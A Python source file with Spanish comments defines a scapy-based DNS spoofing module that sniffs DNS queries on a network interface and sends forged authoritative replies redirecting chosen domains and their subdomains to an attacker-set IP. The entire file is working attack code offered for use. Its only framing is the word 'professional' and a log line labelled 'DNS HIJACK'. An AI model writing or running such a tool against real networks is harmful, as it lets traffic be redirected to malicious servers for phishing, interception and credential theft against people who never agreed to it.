import scapy.all as scapy
import threading
import socket
from backend.logger import log_event

class DNSSpoofer:
    """
    Módulo profesional de DNS Spoofing.
    Permite interceptar y modificar consultas DNS en tiempo real.
    """
    def __init__(self):
        self.running = False
        self.interface = None
        self.spoof_map = {} # domain -> target_ip
        self.thread = None
        
    def start(self, interface, spoof_map=None):
        if self.running: return
        self.interface = interface
        self.spoof_map = spoof_map or {}
        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
        print(f"🎯 DNS Spoofer activo en {interface} con {len(self.spoof_map)} reglas.")

    def stop(self):
        self.running = False
        self.interface = None

    def _run(self):
        # Filtro: Solo paquetes UDP en el puerto 53 (DNS)
        try:
            scapy.sniff(
                iface=self.interface,
                filter="udp port 53",
                prn=self._process_packet,
                store=0,
                stop_filter=lambda x: not self.running
            )
        except Exception as e:
            print(f"Error en DNS Spoofer: {e}")

    def _process_packet(self, pkt):
        if pkt.haslayer(scapy.DNSQR) and self.running:
            try:
                # El qname termina en punto, ej: "google.com."
                qname = pkt[scapy.DNS].qd.qname.decode().lower().strip('.')
                
                for domain, redirect_ip in self.spoof_map.items():
                    target_domain = domain.lower().strip('.')
                    # Match exacto o subdominio (ej: www.google.com matches google.com)
                    if qname == target_domain or qname.endswith('.' + target_domain):
                        print(f"🎯 [DNS Spoof] Interceptado: {qname} -> {redirect_ip}")
                        
                        # Construir respuesta DNS (QR=1: Response, AA=1: Authoritative)
                        spoofed_pkt = scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst)/\
                                      scapy.UDP(dport=pkt[scapy.UDP].sport, sport=pkt[scapy.UDP].dport)/\
                                      scapy.DNS(id=pkt[scapy.DNS].id, qr=1, aa=1, 
                                                qd=pkt[scapy.DNS].qd,
                                                an=scapy.DNSRR(rrname=pkt[scapy.DNS].qd.qname, ttl=10, rdata=redirect_ip))
                        
                        scapy.send(spoofed_pkt, verbose=False, iface=self.interface)
                        
                        # Log profesional
                        from backend.logger import log_event
                        log_event("WARNING", f"🎯 DNS HIJACK: {qname} suplantado por {redirect_ip}")
                        break # Ya procesado
            except Exception as e:
                # Silencioso en producción para no saturar logs si hay paquetes malformados
                pass

# Instancia global
dns_spoofer = DNSSpoofer()
